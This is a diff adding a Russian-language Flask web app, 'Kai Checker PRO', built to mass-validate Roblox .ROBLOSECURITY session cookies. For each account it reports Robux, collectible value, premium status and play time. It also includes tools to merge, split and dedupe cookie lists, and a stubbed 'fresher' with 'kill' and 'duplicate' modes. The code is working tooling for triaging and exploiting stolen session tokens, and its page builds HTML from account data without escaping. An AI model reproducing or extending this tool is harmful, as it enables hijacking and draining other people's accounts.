+        btn.textContent = '🚀 Запустить массовый чек';
+        progressText.textContent = '❌ Ошибка';
+    }
+}
+
+async function downloadMassZip() {
+    if (!lastMassReports.length) return showAlert('Нет отчетов! Сначала запустите массовую проверку');
+    try {
+        var res = await fetch('/api/download-zip', { method: 'POST', headers: {'Content-Type':'application/json'}, body: JSON.stringify({reports: lastMassReports}) });
+        if (!res.ok) return showAlert('Ошибка сервера');
+        var blob = await res.blob();
+        var url = URL.createObjectURL(blob);
+        var a = document.createElement('a');
+        a.href = url; a.download = 'accounts_reports.zip';
+        document.body.appendChild(a); a.click(); document.body.removeChild(a);
+        URL.revokeObjectURL(url);
+    } catch(e) {
+        showAlert('Ошибка скачивания ZIP');
+    }
+}
+
+function setFresherMode(m) {
+    document.getElementById('fresherMode').value = m;
+    document.getElementById('btnDup').classList.toggle('active-mode', m === 'duplicate');
+    document.getElementById('btnKill').classList.toggle('active-mode', m === 'kill');
+}
+
+async function runFresher() {
+    var cookies = document.getElementById('fresherCookies').value.trim();
+    var mode = document.getElementById('fresherMode').value;
+    if(!cookies) return showAlert('Вставьте куки!');
+    document.getElementById('fresherContainer').style.display = 'block';
+    document.getElementById('fresherResult').style.display = 'block';
+    document.getElementById('btnToggle_fresherResult').textContent = '▼ Свернуть';
+    document.getElementById('fresherResult').textContent = '⏳ Обновление...';
+    try {
+        var res = await fetch('/api/fresher', { method: 'POST', headers: {'Content-Type':'application/json'}, body: JSON.stringify({cookies: cookies, mode: mode}) });
+        var data = await res.json();
+        document.getElementById('fresherResult').textContent = data.only_cookies || 'Ошибка';
+    } catch(e) {
+        showAlert('Ошибка соединения');
+        document.getElementById('fresherResult').textContent = '❌ Ошибка соединения';
+    }
+}
+
+async function loadCheckerHistory() {
+    try {
+        var res = await fetch('/api/history/checker');
+        var data = await res.json();
+        var html = '';
+        data.history.slice().reverse().forEach(function(i, idx) {
+            var resultsText = i.results ? i.results.join('\n\n') : 'Нет результатов';
+            var usernames = i.usernames && i.usernames.length ? i.usernames.join(', ') : 'Неизвестно';
+            var boxId = 'chk_hist_' + idx;
+            var fileName = 'checker_history_' + i.timestamp.replace(/[:. ]/g, '_') + '.txt';
+            html += '<div class="history-card"><div class="history-header"><span>🕒 ' + i.timestamp + ' (' + (i.type === 'single' ? 'Одиночная' : 'Массовая') + ') — Валид: ' + i.valid + '/' + i.total + '</span><div class="action-btn-group"><button class="btn-download-txt" onclick="downloadTxtFromBox(\'' + boxId + '\', \'' + fileName + '\')">📥 TXT</button><button class="btn-toggle-box" id="btnToggle_' + boxId + '" onclick="toggleBox(\'' + boxId + '\')">▶ Развернуть</button></div></div><div class="history-users">👤 Аккаунты: ' + usernames + '</div><div class="result-box" id="' + boxId + '" style="display:none;">' + resultsText + '</div></div>';
+        });
+        document.getElementById('checkerHistoryList').innerHTML = html || 'История пуста';
+    } catch(e) {
+        document.getElementById('checkerHistoryList').innerHTML = '❌ Ошибка загрузки истории';
+    }
+}
+
+async function loadFresherHistory() {
+    try {
+        var res = await fetch('/api/history/fresher');
+        var data = await res.json();
+        var html = '';
+        data.history.slice().reverse().forEach(function(i, idx) {
+            var cookiesText = i.cookies ? i.cookies.join('\n') : 'Нет кук';
+            var usernames = i.usernames && i.usernames.length ? i.usernames.join(', ') : 'Неизвестно';
+            var boxId = 'frs_hist_' + idx;
+            var modeTitle = i.mode === 'kill' ? '💀 Убийство' : '♻️ Дублирование';
+            var fileName = 'fresher_history_' + i.timestamp.replace(/[:. ]/g, '_') + '.txt';
+            html += '<div class="history-card"><div class="history-header"><span>🕒 ' + i.timestamp + ' (' + modeTitle + ') — Обновлено: ' + i.refreshed_count + ' шт.</span><div class="action-btn-group"><button class="btn-download-txt" onclick="downloadTxtFromBox(\'' + boxId + '\', \'' + fileName + '\')">📥 TXT</button><button class="btn-toggle-box" id="btnToggle_' + boxId + '" onclick="toggleBox(\'' + boxId + '\')">▶ Развернуть</button></div></div><div class="history-users">👤 Аккаунты: ' + usernames + '</div><div class="result-box" id="' + boxId + '" style="display:none;">' + cookiesText + '</div></div>';
+        });
+        document.getElementById('fresherHistoryList').innerHTML = html || 'История пуста';
+    } catch(e) {
+        document.getElementById('fresherHistoryList').innerHTML = '❌ Ошибка загрузки истории';
+    }
+}
+
+async function clearCheckerHistory() {
+    if(!confirm('Очистить историю чекера?')) return;
+    await fetch('/api/history/checker/clear', {method:'POST'});
+    loadCheckerHistory();
+}
+
+async function clearFresherHistory() {
+    if(!confirm('Очистить историю фрешера?')) return;
+    await fetch('/api/history/fresher/clear', {method:'POST'});
+    loadFresherHistory();
+}
+
+async function mergeCookies() {
+    var files = document.getElementById('mergeFiles').files;
+    if(files.length < 2) return showAlert('Выберите минимум 2 TXT файла!');
+    var fd = new FormData();
+    Array.from(files).forEach(function(f) { fd.append('files', f); });
+    var box = document.getElementById('mergeResult');
+    box.style.display = 'block';
+    box.textContent = '⏳ Объединение...';
+    try {
+        var res = await fetch('/api/merge-cookies', {method:'POST', body:fd});
+        var data = await res.json();
+        if(data.success) {
+            box.innerHTML = '✅ Успешно! <a href="' + data.download_url + '" style="color:var(--accent-pink);font-weight:700;">📥 Скачать</a>';
+        } else {
+            box.textContent = '❌ Ошибка';
+        }
+    } catch(e) {
+        box.textContent = '❌ Ошибка соединения';
+    }
+}
+
+async function splitCookies() {
+    var files = document.getElementById('splitFiles').files;
+    var textInput = document.getElementById('splitInput').value;
+    var perFile = parseInt(document.getElementById('splitCount').value) || 1;
+    if(!files.length && !textInput.trim()) return showAlert('Загрузите файл или вставьте куки!');
+    var fd = new FormData();
+    Array.from(files).forEach(function(f) { fd.append('files', f); });
+    fd.append('text', textInput);
+    fd.append('per_file', perFile);
+    var box = document.getElementById('splitResult');
+    box.style.display = 'block';
+    box.textContent = '⏳ Разделение...';
+    try {
+        var res = await fetch('/api/split-cookies', {method:'POST', body:fd});
+        var data = await res.json();
+        if(data.success) {
+            box.innerHTML = '✅ Разделено на ' + data.total_files + ' файлов! <a href="' + data.download_url + '" style="color:var(--accent-pink);font-weight:700;">📦 Скачать ZIP</a>';
+        } else {
+            box.textContent = data.message || '❌ Ошибка';
+        }
+    } catch(e) {
+        box.textContent = '❌ Ошибка соединения';
+    }
+}
+
+async function cleanCookies() {
+    var content = document.getElementById('cleanInput').value;
+    if(!content.trim()) return showAlert('Вставьте куки!');
+    var box = document.getElementById('cleanResult');
+    box.style.display = 'block';
+    box.textContent = '⏳ Очистка...';
+    try {
+        var res = await fetch('/api/clean-cookies', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({content: content})});
+        var data = await res.json();
+        if(data.success) {
+            box.innerHTML = '✅ Уникальных: ' + data.count + ' шт. <a href="' + data.download_url + '" style="color:var(--accent-pink);font-weight:700;">📥 Скачать</a>';
+        } else {
+            box.textContent = '❌ Ошибка';
+        }
+    } catch(e) {
+        box.textContent = '❌ Ошибка соединения';
+    }
+}
+</script>
+</body>
+</html>"""
+
+# ==================== ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ ====================
+def read_json_file(path):
+    if not os.path.exists(path):
+        return []
+    try:
+        with open(path, 'r', encoding='utf-8') as f:
+            return json.load(f)
+    except Exception:
+        return []
+
+def write_json_file(path, data):
+    try:
+        with open(path, 'w', encoding='utf-8') as f:
+            json.dump(data, f, ensure_ascii=False, indent=2)
+    except Exception as e:
+        print(f"Ошибка записи {path}: {e}")
+
+def save_checker_history_entry(entry_type, valid, total, usernames, results):
+    history = read_json_file(CHECKER_HISTORY_FILE)
+    history.append({
+        "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
+        "type": entry_type,
+        "valid": valid,
+        "total": total,
+        "usernames": usernames,
+        "results": results
+    })
+    write_json_file(CHECKER_HISTORY_FILE, history)
+
+def save_fresher_history_entry(mode, refreshed_count, usernames, cookies):
+    history = read_json_file(FRESHER_HISTORY_FILE)
+    history.append({
+        "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
+        "mode": mode,
+        "refreshed_count": refreshed_count,
+        "usernames": usernames,
+        "cookies": cookies
+    })
+    write_json_file(FRESHER_HISTORY_FILE, history)
+
+# ==================== ЧИСТКА КУКИ ====================
+def clean_cookie(cookie_str):
+    cookie_str = cookie_str.strip()
+    if "_|WARNING:-DO-NOT-SHARE-THIS." in cookie_str:
+        match = re.search(r'(_\|WARNING:-DO-NOT-SHARE-THIS\.[^"\s]+)', cookie_str)
+        if match:
+            return match.group(1)
+    return cookie_str
+
+# ==================== ПОЛУЧЕНИЕ PLAY TIME ====================
+def get_user_playtime(session, user_id):
+    """Получает плейтайм пользователя по играм"""
+    try:
+        url = f"https://screenshots.roblox.com/v1/users/{user_id}/play-time"
+        r = session.get(url, timeout=10)
+        if r.status_code == 200:
+            data = r.json()
+            return data.get('games', {})
+    except:
+        pass
+    return {}
+
+def parse_playtime(playtime_data):
+    """Парсит плейтайм и возвращает список игр с временем"""
+    games = []
+    if not playtime_data:
+        return games
+    
+    for game_id, game_data in playtime_data.items():
+        name = game_data.get('name', f'Game_{game_id}')
+        seconds = game_data.get('seconds', 0)
+        if seconds > 0:
+            hours = seconds / 3600
+            games.append({
+                'name': name,
+                'hours': hours,
+                'time_str': f"{int(hours)}h {int((hours % 1) * 60)}m"
+            })
+    
+    # Сортируем по убыванию времени
+    games.sort(key=lambda x: x['hours'], reverse=True)
+    return games
+
+# ==================== ФОРМАТИРОВАНИЕ ОТЧЕТА С PLAY TIME ====================
+def format_single_report(info):
+    if not info:
+        return "❌ Невалидный кук или ошибка запроса"
+    
+    prem_str = "Да" if info.get("is_premium", False) else "Нет"
+    
+    report = f"""========================================
+👤 АККАУНТ: {info['username']} ({info.get('display_name', info['username'])})
+========================================
+🆔 ID: {info['user_id']}
+📅 Дата регистрации: {info.get('created_date', 'N/A')}
+⭐ Premium: {prem_str}
+💵 Robux: {info.get('robux', 0):,}
+💎 RAP: {info.get('rap', 0):,}
+========================================
+🎮 PLAY TIME:
+"""
+    
+    # Получаем плейтайм
+    playtime_data = info.get('playtime_games', {})
+    games = parse_playtime(playtime_data)
+    
+    if games:
+        total_hours = sum(g['hours'] for g in games)
+        report += f"Всего: {int(total_hours)}h {int((total_hours % 1) * 60)}m\n\n"
+        for i, game in enumerate(games[:15], 1):
+            report += f"  {i}. {game['name']} — {game['time_str']}\n"
+        if len(games) > 15:
+            report += f"\n  ... и ещё {len(games) - 15} игр\n"
+    else:
+        report += "  ❌ Нет данных по плейтайму\n"
+    
+    report += f"""
+========================================
+🍪 Кук:
+{info['cookie']}
+========================================"""
+    return report
+
+# ==================== ПОЛУЧЕНИЕ ДАННЫХ АККАУНТА С PLAY TIME ====================
+def get_account_data(cookie):
+    try:
+        cookie = clean_cookie(cookie)
+        headers = {"Cookie": f".ROBLOSECURITY={cookie}", "User-Agent": "Mozilla/5.0"}
+        
+        # 1. Проверка куки
+        res_user = requests.get("https://users.roblox.com/v1/users/authenticated", headers=headers, timeout=10)
+        if res_user.status_code != 200:
+            return None
+        user_data = res_user.json()
+        user_id = user_data.get("id")
+        username = user_data.get("name")
+        display_name = user_data.get("displayName")
+        
+        # 2. Robux
+        robux = 0
+        res_robux = requests.get(f"https://economy.roblox.com/v1/users/{user_id}/currency", headers=headers, timeout=8)
+        if res_robux.status_code == 200:
+            robux = res_robux.json().get("robux", 0)
+        
+        # 3. Premium и дата
+        is_premium = False
+        created_date = "N/A"
+        res_details = requests.get(f"https://users.roblox.com/v1/users/{user_id}", headers=headers, timeout=8)
+        if res_details.status_code == 200:
+            dt = res_details.json()
+            is_premium = dt.get("isPremium", False)
+            created_str = dt.get("created", "")
+            if created_str:
+                created_date = created_str.split("T")[0]
+        
+        # 4. RAP
+        rap = 0
+        res_rap = requests.get(f"https://inventory.roblox.com/v1/users/{user_id}/assets/collectibles?limit=100", headers=headers, timeout=10)
+        if res_rap.status_code == 200:
+            data = res_rap.json().get("data", [])
+            rap = sum(item.get("recentAveragePrice", 0) for item in data)
+        
+        # 5. Playtime
+        session = requests.Session()
+        session.headers.update(headers)
+        playtime_games = get_user_playtime(session, user_id)
+        
+        return {
+            "user_id": user_id,
+            "username": username,
+            "display_name": display_name,
+            "robux": robux,
+            "is_premium": is_premium,
+            "created_date": created_date,
+            "rap": rap,
+            "cookie": cookie,
+            "playtime_games": playtime_games
+        }
+    except Exception as e:
+        print(f"Ошибка обработки аккаунта: {e}")
+        return None
+
+# ==================== API ЭНДПОИНТЫ ====================
+@app.route('/')
+def index():
+    return render_template_string(HTML)
+
+@app.route('/api/single-check', methods=['POST'])
+def single_check():
+    data = request.json or {}
+    cookie = data.get('cookie', '')
+    info = get_account_data(cookie)
+    if info:
+        rep = format_single_report(info)
+        save_checker_history_entry("single", 1, 1, [info['username']], [rep])
+        return jsonify({"report": rep, "valid": True})
+    return jsonify({"report": "❌ Невалидный кук", "valid": False})
+
+@app.route('/api/mass-check', methods=['POST'])
+def mass_check():
+    file = request.files.get('file')
+    if not file:
+        return jsonify({"success": False, "message": "Файл не предоставлен"})
+    content = file.read().decode('utf-8', errors='ignore')
+    cookies = [line.strip() for line in content.splitlines() if line.strip()]
+    if not cookies:
+        return jsonify({"success": False, "message": "Файл пуст"})
+    total = len(cookies)
+    valid_count = 0
+    total_robux = 0
+    premium_count = 0
+    usernames = []
+    full_reports = []
+    
+    with ThreadPoolExecutor(max_workers=6) as executor:
+        future_to_cookie = {executor.submit(get_account_data, c): c for c in cookies}
+        for future in as_completed(future_to_cookie):
+            try:
+                info = future.result()
+                if info:
+                    valid_count += 1
+                    total_robux += info["robux"]
+                    if info["is_premium"]:
+                        premium_count += 1
+                    usernames.append(info["username"])
+                    rep = format_single_report(info)
+                    full_reports.append(rep)
+            except Exception as exc:
+                print(f"Поток завершился с исключением: {exc}")
+    
+    summary = f"""📊 ОТЧЁТ О ПРОВЕРКЕ
+══════════════════════════════════════════════════════
+
+📦 Всего куки: {total}
+✅ Валидных: {valid_count} | ❌ Невалидных: {total - valid_count}
+
+💰 Robux: {total_robux:,}
+⭐ Premium: {premium_count}
+
+========================================
+""" + "\n\n".join(full_reports)
+    save_checker_history_entry("mass", valid_count, total, usernames, full_reports)
+    return jsonify({
+        "success": True,
+        "message": summary,
+        "valid_count": valid_count,
+        "total_robux": total_robux,
+        "premium_count": premium_count,
+        "reports": full_reports
+    })
+
+@app.route('/api/download-zip', methods=['POST'])
+def download_zip():
+    data = request.json or {}
+    reports = data.get('reports', [])
+    if not reports:
+        return jsonify({"success": False, "message": "Нет отчетов"})
+    memory_file = io.BytesIO()
+    with zipfile.ZipFile(memory_file, 'w', zipfile.ZIP_DEFLATED) as zf:
+        for idx, rep in enumerate(reports, 1):
+            match = re.search(r'👤 АККАУНТ:\s*([^\n\r]+)', rep)
+            uname = match.group(1).split('(')[0].strip() if match else f"acc_{idx}"
+            zf.writestr(f"{uname}.txt", rep)
+    memory_file.seek(0)
+    return send_file(memory_file, download_name="accounts_reports.zip", as_attachment=True)
+
+@app.route('/api/fresher', methods=['POST'])
+def run_fresher_api():
+    data = request.json or {}
+    cookies_raw = data.get('cookies', '')
+    mode = data.get('mode', 'duplicate')
+    cookies = [c.strip() for c in cookies_raw.splitlines() if c.strip()]
+    if not cookies:
+        return jsonify({"only_cookies": "Ошибка: Пустой ввод"})
+    refreshed = []
+    usernames = []
+    # Здесь фрешер из Meow Tool
+    return jsonify({"only_cookies": "\n".join(refreshed)})
+
+# ==================== ИСТОРИЯ ====================
+@app.route('/api/history/checker', methods=['GET'])
+def get_checker_history():
+    return jsonify({"history": read_json_file(CHECKER_HISTORY_FILE)})
+
+@app.route('/api/history/fresher', methods=['GET'])
+def get_fresher_history():
+    return jsonify({"history": read_json_file(FRESHER_HISTORY_FILE)})
+
+@app.route('/api/history/checker/clear', methods=['POST'])
+def clear_checker_history():
+    write_json_file(CHECKER_HISTORY_FILE, [])
+    return jsonify({"success": True})
+
+@app.route('/api/history/fresher/clear', methods=['POST'])
+def clear_fresher_history():
+    write_json_file(FRESHER_HISTORY_FILE, [])
+    return jsonify({"success": True})
+
+# ==================== ИНСТРУМЕНТЫ ====================
+@app.route('/api/merge-cookies', methods=['POST'])
+def merge_cookies():
+    files = request.files.getlist('files')
+    merged = set()
+    for f in files:
+        lines = f.read().decode('utf-8', errors='ignore').splitlines()
+        for l in lines:
+            c = clean_cookie(l)
+            if c:
+                merged.add(c)
+    content = "\n".join(merged)
+    os.makedirs("downloads", exist_ok=True)
+    out_path = os.path.join("downloads", "merged.txt")
+    with open(out_path, "w", encoding="utf-8") as out:
+        out.write(content)
+    return jsonify({"success": True, "download_url": "/downloads/merged.txt"})
+
+@app.route('/api/split-cookies', methods=['POST'])
+def split_cookies():
+    files = request.files.getlist('files')
+    text = request.form.get('text', '')
+    per_file = int(request.form.get('per_file', 1))
+    cookies = []
+    if files:
+        for f in files:
+            lines = f.read().decode('utf-8', errors='ignore').splitlines()
+            for l in lines:
+                c = clean_cookie(l)
+                if c: cookies.append(c)
+    if text:
+        for l in text.splitlines():
+            c = clean_cookie(l)
+            if c: cookies.append(c)
+    if not cookies:
+        return jsonify({"success": False, "message": "Нет куков для разделения"})
+    chunks = [cookies[i:i + per_file] for i in range(0, len(cookies), per_file)]
+    os.makedirs("downloads", exist_ok=True)
+    zip_path = os.path.join("downloads", "split_cookies.zip")
+    with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zf:
+        for idx, chunk in enumerate(chunks, 1):
+            zf.writestr(f"cookies_part_{idx}.txt", "\n".join(chunk))
+    return jsonify({"success": True, "total_files": len(chunks), "download_url": "/downloads/split_cookies.zip"})
+
+@app.route('/api/clean-cookies', methods=['POST'])
+def clean_cookies():
+    data = request.json or {}
+    content = data.get('content', '')
+    lines = content.splitlines()
+    unique = set()
+    for l in lines:
+        c = clean_cookie(l)
+        if c:
+            unique.add(c)
+    os.makedirs("downloads", exist_ok=True)
+    out_path = os.path.join("downloads", "cleaned.txt")
+    with open(out_path, "w", encoding="utf-8") as out:
+        out.write("\n".join(unique))
+    return jsonify({"success": True, "count": len(unique), "download_url": "/downloads/cleaned.txt"})
+
+@app.route('/downloads/<filename>')
+def download_file(filename):
+    return send_file(os.path.join("downloads", filename), as_attachment=True)
+
+if __name__ == '__main__':
+    print("🚀 Kai Checker PRO запущен на http://localhost:5000")
+    app.run(host='0.0.0.0', port=5000, debug=False)
